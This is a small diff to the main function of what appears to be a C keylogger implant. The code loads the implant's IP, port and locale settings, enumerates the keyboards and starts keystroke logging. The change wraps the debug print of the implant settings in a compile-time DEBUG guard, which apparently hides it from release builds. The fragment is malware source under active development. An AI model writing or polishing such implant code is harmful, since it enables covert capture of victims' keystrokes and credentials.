@@ -14,11 +14,13 @@ int main(int ac, char **av) {
         return 1;
 
     get_locale(&instance);
+
+#ifdef DEBUG
     DEBUG_LOG(
-        instance.debug_enabled,
         "[*] Implant settings:\n\tIP:%s\n\tPort:%d\n\tlocale:%s",
         instance.ip, instance.port, instance.locale
     );
+#endif
 
     fetch_available_keyboards(&instance);
     keylog(&instance);
